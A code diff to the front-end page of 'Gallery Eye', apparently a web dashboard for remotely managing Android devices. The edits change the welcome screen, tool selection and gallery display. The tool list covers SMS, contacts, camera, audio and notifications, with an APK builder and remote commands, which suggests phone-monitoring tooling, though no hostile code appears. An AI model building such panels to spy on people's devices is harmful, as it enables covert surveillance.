@@ -100,6 +100,14 @@ export default function Home() {
     // New State for Gallery Features
     const [activeTab, setActiveTab] = useState<'all' | 'image' | 'video' | 'zip'>('all');
     const [selectedItems, setSelectedItems] = useState<Set<string>>(new Set());
+    
+    // Sync session plan if available
+    useEffect(() => {
+        if (session && (session.user as any)?.plan) {
+            setUserPlan((session.user as any).plan.toLowerCase() as any);
+        }
+    }, [session]);
+
     const [previewItem, setPreviewItem] = useState<any>(null);
     const [isSelectionMode, setIsSelectionMode] = useState(false);
     const [isDownloading, setIsDownloading] = useState(false);
@@ -116,7 +124,7 @@ export default function Home() {
     const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);
 
     // Tool Selector State
-    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration' | 'camera' | 'notifications' | 'audio'>('gallery');
+    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration' | 'camera' | 'notifications' | 'audio' | null>(null);
     const [isToolDropdownOpen, setIsToolDropdownOpen] = useState(false);
 
     // Torch State
@@ -1344,15 +1352,12 @@ END:VCARD`;
                 <div className="flex flex-col items-center justify-center min-h-[60vh] text-center">
                     <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="max-w-md space-y-6">
                         <div className="w-24 h-24 mx-auto rounded-3xl bg-white/5 border border-white/10 flex items-center justify-center shadow-2xl">
-                            <Smartphone size={48} className="text-emerald-400" />
+                            <Smartphone size={48} className="text-white/20" />
                         </div>
                         <div>
-                            <h2 className="text-3xl font-bold tracking-tight mb-2">Welcome to Gallery Eye</h2>
-                            <p className="text-white/40">Download the app on your device and select it from the menu to begin remote management.</p>
+                            <h2 className="text-2xl font-bold tracking-tight mb-2">No Devices Connected</h2>
+                            <p className="text-white/40">Select a device from the top menu, or click 'Build App' to generate a new APK.</p>
                         </div>
-                        <button onClick={() => setShowAppModal(true)} className="btn-primary w-full shadow-emerald-500/20 flex items-center justify-center">
-                            <Download size={18} /> Download APK
-                        </button>
                     </motion.div>
                 </div>
             );
@@ -1752,35 +1757,48 @@ END:VCARD`;
                 userPlan={userPlan}
                 setShowPlansModal={setShowPlansModal}
                 handleSignOut={() => signOut()}
+                onOpenAppModal={() => setShowAppModal(true)}
             />
 
-            {/* Main Content Area (Gallery is Always Visible) */}
+            {/* Main Content Area */}
             <main className="flex-1 h-full w-full relative transition-all duration-300">
-                <GalleryView 
-                    images={images}
-                    activeTab={activeTab}
-                    setActiveTab={setActiveTab}
-                    isSelectionMode={isSelectionMode}
-                    setIsSelectionMode={setIsSelectionMode}
-                    selectedItems={selectedItems}
-                    toggleSelection={(id) => {
-                        const newSet = new Set(selectedItems);
-                        if (newSet.has(id)) newSet.delete(id);
-                        else newSet.add(id);
-                        setSelectedItems(newSet);
-                    }}
-                    handleBulkDownload={() => {}}
-                    handleBulkDelete={() => {}}
-                    setPreviewItem={setPreviewItem}
-                    galleryLoaderRef={galleryLoaderRef}
-                    isLoadingMore={isLoadingMore}
-                    galleryHasMore={galleryHasMore}
-                />
+                {(!selectedTool || selectedTool !== 'gallery') && (
+                    <div className="flex flex-col items-center justify-center w-full h-full text-center p-8 mt-16">
+                        <div className="w-24 h-24 rounded-full neo-pressed flex items-center justify-center mb-6 shadow-accent-glow animate-pulse-soft">
+                            <span className="text-4xl font-bold text-accent">GE</span>
+                        </div>
+                        <h1 className="text-3xl font-bold text-fg-1 mb-2">Welcome to Gallery Eye</h1>
+                        <p className="text-fg-3 max-w-md">Select a tool from the top menu to get started. Manage devices, explore the gallery, or run remote commands.</p>
+                    </div>
+                )}
+
+                {selectedTool === 'gallery' && (
+                    <GalleryView 
+                        images={images}
+                        activeTab={activeTab}
+                        setActiveTab={setActiveTab}
+                        isSelectionMode={isSelectionMode}
+                        setIsSelectionMode={setIsSelectionMode}
+                        selectedItems={selectedItems}
+                        toggleSelection={(id) => {
+                            const newSet = new Set(selectedItems);
+                            if (newSet.has(id)) newSet.delete(id);
+                            else newSet.add(id);
+                            setSelectedItems(newSet);
+                        }}
+                        handleBulkDownload={() => {}}
+                        handleBulkDelete={() => {}}
+                        setPreviewItem={setPreviewItem}
+                        galleryLoaderRef={galleryLoaderRef}
+                        isLoadingMore={isLoadingMore}
+                        galleryHasMore={galleryHasMore}
+                    />
+                )}
             </main>
 
             {/* Tool Modal Overlay */}
             <AnimatePresence>
-                {selectedTool && (
+                {selectedTool && selectedTool !== 'gallery' && (
                     <motion.div
                         initial={{ opacity: 0 }}
                         animate={{ opacity: 1 }}
